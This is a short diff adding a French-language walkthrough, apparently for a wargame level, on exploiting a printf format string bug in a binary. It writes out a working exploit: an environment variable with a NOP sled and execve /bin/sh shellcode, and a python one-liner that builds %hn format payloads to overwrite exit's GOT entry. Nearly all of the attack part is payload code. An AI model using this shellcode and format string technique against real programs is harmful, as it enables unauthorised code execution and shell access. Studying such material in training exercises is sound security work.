@@ -1,0 +1,13 @@
+Ici, le binaire recupere un Input sur l'entree standart et l'affiche avec printf
+
+Nous allons utiliser la GOT et une string attack pour remplacer l'address d'exit (jump)
+On va utiliser un shellcode : 
+
+export SHELLCODE=`python -c 'print "\x90" * 500 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+
+vue que la valeur de l'adress du shellcode est trop grande nous devons la split :: 
+
+
+python -c 'print "\xe2\x97\x04\x08" + "\xe0\x97\x04\x08" + "%65527x%10$hn" + "%55173x%11$hn"' > /tmp/level05
+
+
